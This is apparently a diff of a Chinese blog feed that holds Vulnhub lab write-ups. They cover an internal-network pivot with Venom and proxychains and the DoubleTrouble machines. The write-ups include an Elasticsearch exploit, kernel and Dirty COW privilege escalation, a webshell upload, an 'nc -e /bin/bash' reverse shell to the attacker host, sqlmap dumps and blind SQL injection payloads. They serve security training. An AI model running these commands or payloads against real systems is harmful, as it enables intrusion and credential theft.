+<p>可以通过 <code>ping</code> 只要修改最后面的数值即可，但是这里子网有16位，也就是有65535个IP地址需要测试。 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">for i in $(seq 1 255);do ping -c 1 172.17.0.$i; done</span><br><span class="line"></span><br><span class="line">for i in $(seq 0 255);do for j in $(seq 1 255);do ping -c 1 172.17.$i.$j;done;done</span><br><span class="line">解释：双层循环，-c后面的 1 表示一个地址只发一个数据包</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327185626.png" /></p>
+<p>发现内网内只有3个IP地址存活（这个脚本运行的比较慢，也可以用工具）。</p>
+<p>当前IP地址是 172.17.0.2，那么接下来就需要对另外两个主机进行扫描，因为kali的工具无法直接应用在内网环境下，所以需要利用代理，将172.17.0.2作为代理对内网主机进行扫描。</p>
+<h2 id="内网穿透">内网穿透</h2>
+<p>内网穿透工具：<a href="https://github.com/Dliv3/Venom">venom</a></p>
+<p>kali 另开一个cmd监听 9999 端口： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./admin_linux_x64 -lport 9999</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327191518.png" /></p>
+<p>kali 开启 http 服务： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 8295</span><br><span class="line"></span><br><span class="line">注意：要在venom所在目录运行，换句话说，要在agent.exe在的</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327191624.png" /></p>
+<p>靶机从kali下载代理端，并运行： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://192.168.137.101:8295/agent_linux_x64 根据靶机的操作系统选择对应的代理端</span><br><span class="line">如果提示没有文件，查看以下kali开启的http服务是否在venom目录下</span><br><span class="line"></span><br><span class="line">chmod +x agent_linux_x64</span><br><span class="line"></span><br><span class="line">./agent_linux_x64 -rhost 192.168.137.101 -rport 9999</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327192942.png" /></p>
+<p>启动 socks5 代理： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. show</span><br><span class="line">2. goto 1</span><br><span class="line">3. socks 1080 端口可以选其他的</span><br></pre></td></tr></table></figure> <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327193102.png" /></p>
+<p>接下来修改配置文件 <code>proxychains4.conf</code>，这样就可以让工具通过代理进行工作了，命令前要加上 <code>proxychains</code>。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/proxychains4.conf</span><br><span class="line"></span><br><span class="line">将原来的 socks4 127.0.0.1 9050 注释</span><br><span class="line">添加：</span><br><span class="line">socks5 127.0.0.1 1080</span><br></pre></td></tr></table></figure></p>
+<h2 id="内网信息收集">内网信息收集</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. proxychains4 nmap -Pn -sT 172.17.0.1</span><br><span class="line">2. proxychains4 nmap -Pn -sT 172.17.0.3</span><br></pre></td></tr></table></figure>
+<p>结果分别为：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327194514.png" /></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327194527.png" /></p>
+<p>可以看到 172.17.0.1 的端口和服务与之前扫描 192.168.137.102 的时候一模一样，所以推测，这就是真正的主机。</p>
+<p>可以做一下验证，利用浏览器去访问 <code>172.17.0.1:5000</code> ，如果出现对应的页面，即可确定这就是真正的主机。</p>
+<p>不过浏览器也要设置代理，（其实也可以用 <code>proxychains4 firefox</code> 来打开浏览器，但是我这里不知道为什么实现不了）</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327195300.png" /></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327195311.png" /></p>
+<p>到此，可以完全确定 <code>172.17.0.1</code> 就是真正的主机！还有 <code>172.17.0.2</code> 也需要扫描（这里是因为我们之前拿到的是webshell，扫描看一下有没有漏洞能拿到shell权限）。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains nmap -Pn -sT 172.17.0.2</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327195702.png" /></p>
+<p>发现 9200 端口打开。查看一下对应的服务： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains nmap -Pn -sT -p9200 -sV 172.17.0.2</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327195826.png" /></p>
+<p><code>Elasticsearch</code> 版本为 1.4.2。可以用msf查看一下是否存在漏洞。</p>
+<h2 id="漏洞利用">漏洞利用</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit Elasticsearch</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327200545.png" /></p>
+<p>可以一个一个尝试，先尝试第一个。将exp复制到当前目录： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp /usr/share/exploitdb/exploits/linux/remote/36337.py .</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327201304.png" /></p>
+<p>可以用 <code>cat 36337.py</code> 查看一下exp说明，发现是 python2 编写的。</p>
+<p>执行exp <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains4 python2 36337.py 172.17.0.2</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327201554.png" /></p>
+<p>又得到一个root权限，但是我们知道，这并不是真正的目标主机，因此进行信息收集。先查看目录，发现有一个 passwords 的文件。查看其中的内容：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327201855.png" /></p>
+<p>密码一般都是md5加密的，故尝试将所有密码用md5解密，推荐网址：<a href="https://www.somd5.com/">MD5解密</a>得到： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">john:1337hack</span><br><span class="line">test:1234test</span><br><span class="line">admin:1111pass</span><br><span class="line">root:1234pass</span><br><span class="line">jane:1234jane</span><br></pre></td></tr></table></figure></p>
+<p>想去目标主机开了 22 端口，服务为 ssh，因此尝试使用者这些账号和密码连接： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh [-p 22] john@192.168.100.102 不指定端口的话，默认就是22</span><br></pre></td></tr></table></figure></p>
+<p>经尝试，发现只有 john 能够成功登录。接下来就是提权了。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327202920.png" /></p>
+<h2 id="权限提升-本地提权">权限提升-本地提权</h2>
+<p>Linux提权一般优先考虑内核漏洞进行提权。从ssh连接可以看出靶机的系统为 Ubuntu 并且版本为 3.13.0，当且的版本因该是5.x。这里差了两个大更新，因此大概率存在着漏洞。用msf搜索。 <code>searchsploit linux kernel 3.13</code> 可以看到搜索出很多，真实场景的话需要一个一个尝试，这里就挑选一个 37292.c</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327203630.png" /></p>
+<p>复制exp到当前目录 <code>cp /usr/share/exploitdb/exploits/linux/local/37292.c .</code></p>
+<p>这是c编写的，需要用 gcc 编译，但是目标主机可能没有 gcc，所以需要在kali上编译完在传到靶机。因为它是C语言写的，所以查看一下内容是否还有编译的</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327203936.png" /></p>
+<p>注意到，代码中还调用system，然后利用 gcc 进行编译，因此要进行修改。把相关的代码删除，然后进行编译。（删掉部分从图中第二行开始到if语句结束）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc 37292.c -o a</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327205736.png" /></p>
+<p>将 <code>ofs-lib.so</code> 文件也复制到相同目录，一起传到目标主机。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">locate ofs-lib.so</span><br><span class="line"></span><br><span class="line">如果提示：var/lib/mlocate/mlocate.db: 没有那个文件或目录。说明数据库太久没更新了，利用 updtedb 更新一下在搜索即可、</span><br><span class="line"></span><br><span class="line">cp /usr/share/metasploit-framework/data/exploits/CVE-2015-1328/ofs-lib.so .</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327211113.png" /></p>
+<p>然后开启http服务，目标主机下载这两个文件</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327211453.png" /></p>
 <blockquote>
-<p>找到开源CMS的时候，需要查看一下更新的记录，里面有时候会记载类似“修复了xxx漏洞”信息。</p>
+<p>为了更好的利用exp，建议将这两个文件移到 <code>tmp</code> 目录，因为这个目录的权限一般比较多</p>
 </blockquote>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418091401.png" /></p>
-<p>搜索了一下该CMS的默认账号密码如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin@localhost.com</span><br><span class="line">admin</span><br></pre></td></tr></table></figure></p>
-<p>但是无法登录。去GitHub上找了源码，但是检查了所有文件发现都没有任何有用的信息，链接如下：</p>
-<ul>
-<li>https://github.com/dodiksunaryo/qdpm</li>
-</ul>
-<p>最后，还是进行路径扫描，发现了许多文件（在查看源码的时候也看到了）</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418091804.png" /></p>
-<p>一一查看之后还是没有什么信息。<code>/secret</code>中放着一张图片，本来没什么重要的，但是这个目录的名字像是一个提示，因此联想到可能这张图片经过了隐写！</p>
-<h2 id="隐写术密码破解">2.3 隐写术密码破解</h2>
-<p>首先将图片下载到kali，然后使用<code>steghide</code>进行查看</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418092027.png" /></p>
-<p>发现需要输入密码，因此进而确定该图片隐写了某些内容。此时利用一款新的工具<code>stegseek</code>，官网：</p>
-<ul>
-<li>https://github.com/RickdeJager/stegseek</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">stegseek --seed doubletrouble.jpg <span class="comment"># 检测信息</span></span><br><span class="line">stegseek --crack doubletrouble.jpg rockyou.txt <span class="comment"># 提取信息</span></span><br></pre></td></tr></table></figure>
-<p>最后得到一个文件<code>doubletrouble.jpg.out</code>，查看其中的内容，得到两串字符： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">otisrush@localhost.com</span><br><span class="line">otis666</span><br></pre></td></tr></table></figure></p>
-<p>看这个格式像是之前登录界面的邮箱和密码，尝试登陆，发现进入了后台！</p>
-<h2 id="get-shell">2.4 get shell</h2>
-<p>这里有两种办法：</p>
-<ul>
-<li>第一种，利用msf搜索<code>searchsploit qdpm 9.1</code>，然后使用红框的exp即可（红框的是最新的，但是和前一个利用的是一样的漏洞。不过代码有点乱，需要自己整理一下） <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418092814.png" /></li>
-<li>第二种，在后台我也找到了对应的文件上传点，可以直接上传后门，没有任何拦截</li>
-</ul>
-<p>接下来主要介绍第二种，第一种很简单，修改一下代码传到靶机执行就可以了。</p>
-<p>进入后台之后，我首先查看了配置里面的信息，发现了疑似文件上传点</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418093052.png" /></p>
-<p>然后我上传了一个php文件，提示如下</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418093153.png" /></p>
-<p>但是问题是，没给上传文件的路径。这时候我想到了路径扫描的时候扫到了一个<code>/uploads</code>，就去查看了一下，功夫不负有心人，终于被我找到了，在<code>10.0.2.17/uploads/users</code>里面放着上传的文件（我还以为不成功，上传了许多次）</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418093326.png" /></p>
-<p>接下来直接蚁剑上线即可。</p>
-<h2 id="权限提升">2.5 权限提升</h2>
-<p>在蚁剑的shell上输入<code>nc -e /bin/bash 10.0.2.4 3333</code>将shell反弹到kali。可以升级一下shell（需要注意，靶机没有python3）。</p>
-<p>然后输入<code>sudo -l</code>查看的时候，发现了如下信息</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418093801.png" /></p>
-<p>然后去了<a href="https://gtfobins.github.io/">GTFOBins</a>发现了可以利用这个配置不当从而提权，命令如下： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo /usr/bin/awk <span class="string">&#x27;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&#x27;</span></span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418094017.png" /></p>
-<p>查看<code>/root</code>发现了又一台虚拟机，先将该虚拟机传给kali，然后通过共享文件夹传到主机，最后再启动 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">靶机: nc 10.0.2.4 4444 &lt; doubletrouble.ova -w 1 # 传输完1s后自动断开</span><br><span class="line">kali: nc -lvnp 4444 &gt; doubletrouble2.ova</span><br></pre></td></tr></table></figure></p>
-<h1 id="渗透第二台靶机">3 渗透——第二台靶机</h1>
-<h2 id="主机发现端口扫描端口服务发现-1">3.1 主机发现、端口扫描、端口服务发现</h2>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.18</span><br><span class="line">sudo nmap -p22,80 -A 10.0.2.18</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418094403.png" /></p>
-<p>信息如下：</p>
-<ul>
-<li>22端口的服务为ssh</li>
-<li>80端口的服务为http</li>
-<li>靶机的操作系统为Debian</li>
-<li><strong>Linux内核为3.x</strong></li>
-</ul>
-<h2 id="访问http服务get-shell">3.2 访问http服务、get shell</h2>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418094543.png" /></p>
-<p>不论输入什么，这个页面都没有任何回应（就离谱，给我的感觉就是做了个登录界面，并没有登录这个功能）</p>
-<p>路径扫描也没有其他结果：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418094824.png" /></p>
-<p>因此，漏洞只可能出现在登录界面，但是不论输入什么都没有任何反应。使用sqlmap，可以发现漏洞，因此直接用sqlmap扫： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -r r.txt -p uname --dbs -&gt; doubletrouble, information_schema</span><br><span class="line">sqlmap -r r.txt -p uname -D doubletrouble --tables -&gt; users</span><br><span class="line">sqlmap -r r.txt -p uname -D doubletrouble -T users --columns -&gt; username, password</span><br><span class="line">sqlmap -r r.txt -p uname -D doubletrouble -T users -C username,password --dump</span><br></pre></td></tr></table></figure></p>
-<p>最终得到如下信息：</p>
-<table>
-<thead>
-<tr class="header">
-<th style="text-align: center;">username</th>
-<th style="text-align: center;">password</th>
-</tr>
-</thead>
-<tbody>
-<tr class="odd">
-<td style="text-align: center;">montreux</td>
-<td style="text-align: center;">GfsZxc1</td>
-</tr>
-<tr class="even">
-<td style="text-align: center;">clapton</td>
-<td style="text-align: center;">ZubZub99</td>
-</tr>
-</tbody>
-</table>
-<p>然后去登陆界面登录，发现两个都登录不上。首先这不太可能是错误的消息，那么只有一种可能，那就是并不是登录界面的用户名和密码。在端口扫描中发现了22端口有着ssh服务，因此尝试连接，发现第二个用户和密码可以连接的上。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418101134.png" /></p>
-<h2 id="权限提升-1">3.3 权限提升</h2>
-<p>首先查看了sudo配置，发现该靶机都没有sudo命令。suid权限也没有获得有用的信息。但是查看内核时发现，该靶机的Linux内核比较的老</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418101313.png" /></p>
-<p>因此，可能存在内核漏洞，这里介绍脏牛漏洞<a href="https://github.com/FireFart/dirtycow">dirty</a></p>
-<blockquote>
-<p>该漏洞利用dirtycow漏洞的pokemon漏洞利用作为基础，自动生成新的passwd行。运行二进制文件时，将提示用户输入新密码。然后将原始 /etc/passwd 文件备份到 /tmp/passwd.bak 并用生成的行覆盖 root 帐户。运行漏洞利用后，您应该能够使用新创建的用户登录。</p>
-</blockquote>
-<p>将exp放到靶机上，然后编译执行即可，注意要进入可读可写的目录，比如<code>/tmp</code>。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -pthread dirty.c -o dirty -lcrypt</span><br><span class="line">./dirty</span><br></pre></td></tr></table></figure></p>
-<p>然后需要输入新的密码。该漏洞会创建一个名为<code>firefart</code>的用户，但是拥有root权限</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418101933.png" /></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418102252.png" /></p>
-<hr />
-<p>脏牛提权后，利用下述命令恢复原来的<code>/etc/passwd</code>： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mv /tmp/passwd.bak /etc/passwd</span><br></pre></td></tr></table></figure></p>
-<hr />
-<p>接下来查看两个flag，第一个在<code>/root/root.txt</code>，第二个在<code>/home/clapton/user.txt</code> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// root.txt</span><br><span class="line">1B8EEA89EA92CECB931E3CC25AA8DE21</span><br><span class="line"></span><br><span class="line">// user.txt</span><br><span class="line">6CEA7A737C7C651F6DA7669109B5FB52</span><br></pre></td></tr></table></figure></p>
-<p>靶机到此结束！</p>
-<h1 id="总结">4 总结</h1>
-<p>该靶机的难度确实不算难，不过还是存在着几个难点：</p>
-<ul>
-<li>第一台靶机的隐写术密码爆破</li>
-<li>第二台靶机的时间盲注的<strong>发现</strong></li>
-</ul>
-<p>我感觉第二台靶机只是做了一个登录界面，将我们输入的内容带入MySQL进行查询，不论结果对错，也不论是否有语法错误，都没有任何提示。现实情况下总会有不同的提示的，所以这里是一个难点。</p>
-<h2 id="sql注入时间盲注">4.1 SQL注入——时间盲注</h2>
-<p>如果后台语句为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users where username=&#x27;.$_POST[&quot;uname&quot;].&#x27; and password=&#x27;.$_POST[&quot;psw&quot;].&#x27;;</span><br></pre></td></tr></table></figure></p>
-<p>那么只需要<code>uname=1'and sleep(5)#&amp;psw=1</code>即可，此时： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users where username=&#x27;1&#x27;and sleep(5)#&#x27; and password=&#x27;1&#x27;;</span><br></pre></td></tr></table></figure></p>
-<p>但是该靶机不行，此时小技巧： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=1&#x27; and(select x from (select (sleep(3)))alia)#</span><br></pre></td></tr></table></figure></p>
-<p>解释：</p>
-<p>此时，不论后台语句如何，至少存在 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=1&#x27; and(select x from(select (sleep(5)))alia)#</span><br></pre></td></tr></table></figure></p>
-<p>那么先查询<code>select (sleep(3))</code>，直接触发，然后将返回的结果起个别名<code>alia</code>，最后执行<code>select x from alia</code>，因为<code>alia</code>中必定不存在<code>x</code>，所以没有返回结果，因此最终呈现的效果就是页面返回的时间被延迟了。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418104149.png" /></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mv * /tmp</span><br></pre></td></tr></table></figure>
+<p>执行exp拿到root权限。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. cd /tmp</span><br><span class="line">2. chmod +x a</span><br><span class="line">3. ./a</span><br><span class="line">4. id</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327211724.png" /></p>
+<p>到此为止，整个靶机的攻击过程都结束了。</p>
+<h1 id="总结">总结</h1>
+<p>完整的渗透过程主要有三个部分：</p>
+<ol type="1">
+<li>利用Web漏洞，拿到webshell，然后再拿到低权限shell；</li>
+<li>权限提升，收集内网信息，确认存活主机。信息收集的越多，发现的可利用漏洞越多，第三步越容易成功；</li>
+<li>依次拿到权限，最终拿到目标主机的root权限（比如域控）；</li>
+</ol>
+<p>该靶机给我的最大启示如下：</p>
+<ol type="1">
+<li>找到漏洞exp的时候不要着急的利用，先查看一下代码，代码中所利用的命令可能目标主机上并没有，所以需要在我们自己的主机上准备就绪后再传到目标主机。</li>
+<li><code>/tmp</code> 权限比较多</li>
+</ol>
 ]]></content>
       <categories>
         <category>内网渗透</category>
@@ -740,11 +573,6 @@
       <tags>
         <tag>综合</tag>
         <tag>vulnhub</tag>
-        <tag>隐写术</tag>
-        <tag>开源CMS漏洞利用</tag>
-        <tag>GTFObins提权</tag>
-        <tag>SQL注入</tag>
-        <tag>脏牛提权</tag>
       </tags>
   </entry>
   <entry>
@@ -1086,6 +914,178 @@
         <tag>HTTP3协议</tag>
         <tag>Gopher</tag>
         <tag>浏览器密码还原</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>13 Vulnhub DoubleTrouble Writeup</title>
+    <url>/2022/04/18/13%20Vulnhub%20DoubleTrouble%20Writeup/</url>
+    <content><![CDATA[<p>该靶机难度为简单，漏洞其实都不难发现，主要的难点在于第一台靶机隐写图片的发现和破解以及第二台靶机的sql注入漏洞的发现。</p>
+<span id="more"></span>
+<h1 id="靶机信息">1 靶机信息</h1>
+<p>靶机地址：</p>
+<ul>
+<li>https://www.vulnhub.com/entry/doubletrouble-1,743/</li>
+</ul>
+<p>难度：</p>
+<ul>
+<li>简单</li>
+</ul>
+<p>目标：</p>
+<ul>
+<li>取得两台靶机root权限</li>
+<li>拿到两个flag</li>
+</ul>
+<p>涉及攻击方法：</p>
+<ul>
+<li>主机发现</li>
+<li>端口扫描</li>
+<li>Web信息收集</li>
+<li>开源CMS漏洞利用</li>
+<li>文件上传</li>
+<li>隐写术</li>
+<li>密码爆破</li>
+<li>GTFObins提权</li>
+<li>SQL盲注</li>
+<li><strong>脏牛提权</strong></li>
+</ul>
+<h1 id="渗透第一台靶机">2 渗透——第一台靶机</h1>
+<p>攻击主机kali: 10.0.2.4</p>
+<h2 id="主机发现端口扫描端口服务发现">2.1 主机发现、端口扫描、端口服务发现</h2>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.17</span><br><span class="line">sudo nmap -p22,80 -A 10.0.2.17</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418091054.png" /></p>
+<p>得到如下信息：</p>
+<ul>
+<li>22端口的服务为ssh</li>
+<li>80端口的服务为http，版本为Apache2.4.38</li>
+<li>靶机操作系统为Debian</li>
+</ul>
+<h2 id="访问http服务">2.2 访问http服务</h2>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418091209.png" /></p>
+<p>得到一个登陆界面，经尝试，发现不知道邮箱无法登录，也不存在sql注入。但是下面的两行内容很奇怪，点击发现来到了<code>qdPM</code>官网，发现，这是一个开源的CMS，最新的版本是9.2，而靶机的是9.1，因而查看了一下更新日志，除了找到几个路径之外（路径扫描也能扫出来），没有其他收获。</p>
+<blockquote>
+<p>找到开源CMS的时候，需要查看一下更新的记录，里面有时候会记载类似“修复了xxx漏洞”信息。</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418091401.png" /></p>
+<p>搜索了一下该CMS的默认账号密码如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin@localhost.com</span><br><span class="line">admin</span><br></pre></td></tr></table></figure></p>
+<p>但是无法登录。去GitHub上找了源码，但是检查了所有文件发现都没有任何有用的信息，链接如下：</p>
+<ul>
+<li>https://github.com/dodiksunaryo/qdpm</li>
+</ul>
+<p>最后，还是进行路径扫描，发现了许多文件（在查看源码的时候也看到了）</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418091804.png" /></p>
+<p>一一查看之后还是没有什么信息。<code>/secret</code>中放着一张图片，本来没什么重要的，但是这个目录的名字像是一个提示，因此联想到可能这张图片经过了隐写！</p>
+<h2 id="隐写术密码破解">2.3 隐写术密码破解</h2>
+<p>首先将图片下载到kali，然后使用<code>steghide</code>进行查看</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418092027.png" /></p>
+<p>发现需要输入密码，因此进而确定该图片隐写了某些内容。此时利用一款新的工具<code>stegseek</code>，官网：</p>
+<ul>
+<li>https://github.com/RickdeJager/stegseek</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">stegseek --seed doubletrouble.jpg <span class="comment"># 检测信息</span></span><br><span class="line">stegseek --crack doubletrouble.jpg rockyou.txt <span class="comment"># 提取信息</span></span><br></pre></td></tr></table></figure>
+<p>最后得到一个文件<code>doubletrouble.jpg.out</code>，查看其中的内容，得到两串字符： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">otisrush@localhost.com</span><br><span class="line">otis666</span><br></pre></td></tr></table></figure></p>
+<p>看这个格式像是之前登录界面的邮箱和密码，尝试登陆，发现进入了后台！</p>
+<h2 id="get-shell">2.4 get shell</h2>
+<p>这里有两种办法：</p>
+<ul>
+<li>第一种，利用msf搜索<code>searchsploit qdpm 9.1</code>，然后使用红框的exp即可（红框的是最新的，但是和前一个利用的是一样的漏洞。不过代码有点乱，需要自己整理一下） <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418092814.png" /></li>
+<li>第二种，在后台我也找到了对应的文件上传点，可以直接上传后门，没有任何拦截</li>
+</ul>
+<p>接下来主要介绍第二种，第一种很简单，修改一下代码传到靶机执行就可以了。</p>
+<p>进入后台之后，我首先查看了配置里面的信息，发现了疑似文件上传点</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418093052.png" /></p>
+<p>然后我上传了一个php文件，提示如下</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418093153.png" /></p>
+<p>但是问题是，没给上传文件的路径。这时候我想到了路径扫描的时候扫到了一个<code>/uploads</code>，就去查看了一下，功夫不负有心人，终于被我找到了，在<code>10.0.2.17/uploads/users</code>里面放着上传的文件（我还以为不成功，上传了许多次）</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418093326.png" /></p>
+<p>接下来直接蚁剑上线即可。</p>
+<h2 id="权限提升">2.5 权限提升</h2>
+<p>在蚁剑的shell上输入<code>nc -e /bin/bash 10.0.2.4 3333</code>将shell反弹到kali。可以升级一下shell（需要注意，靶机没有python3）。</p>
+<p>然后输入<code>sudo -l</code>查看的时候，发现了如下信息</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418093801.png" /></p>
+<p>然后去了<a href="https://gtfobins.github.io/">GTFOBins</a>发现了可以利用这个配置不当从而提权，命令如下： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo /usr/bin/awk <span class="string">&#x27;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&#x27;</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418094017.png" /></p>
+<p>查看<code>/root</code>发现了又一台虚拟机，先将该虚拟机传给kali，然后通过共享文件夹传到主机，最后再启动 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">靶机: nc 10.0.2.4 4444 &lt; doubletrouble.ova -w 1 # 传输完1s后自动断开</span><br><span class="line">kali: nc -lvnp 4444 &gt; doubletrouble2.ova</span><br></pre></td></tr></table></figure></p>
+<h1 id="渗透第二台靶机">3 渗透——第二台靶机</h1>
+<h2 id="主机发现端口扫描端口服务发现-1">3.1 主机发现、端口扫描、端口服务发现</h2>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.18</span><br><span class="line">sudo nmap -p22,80 -A 10.0.2.18</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418094403.png" /></p>
+<p>信息如下：</p>
+<ul>
+<li>22端口的服务为ssh</li>
+<li>80端口的服务为http</li>
+<li>靶机的操作系统为Debian</li>
+<li><strong>Linux内核为3.x</strong></li>
+</ul>
+<h2 id="访问http服务get-shell">3.2 访问http服务、get shell</h2>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418094543.png" /></p>
+<p>不论输入什么，这个页面都没有任何回应（就离谱，给我的感觉就是做了个登录界面，并没有登录这个功能）</p>
+<p>路径扫描也没有其他结果：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418094824.png" /></p>
